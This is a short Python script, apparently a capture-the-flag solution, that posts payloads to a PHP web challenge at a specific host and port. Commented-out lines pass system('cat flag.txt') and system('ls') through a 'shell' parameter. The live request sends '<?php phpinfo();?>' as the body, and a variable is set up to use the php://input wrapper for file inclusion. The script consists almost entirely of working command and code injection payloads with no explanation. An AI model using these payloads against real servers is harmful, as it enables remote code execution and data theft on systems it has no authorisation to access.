import requests
url='http://www.whalwl.site:8014/index.php?'
# data={'shell':"system('cat flag.txt');"}
# data2={'shell':"system('ls');"}
data=("<?php phpinfo();?>")
data2={"file":'php://input&'}
print(requests.post(url=url,data=data).text)
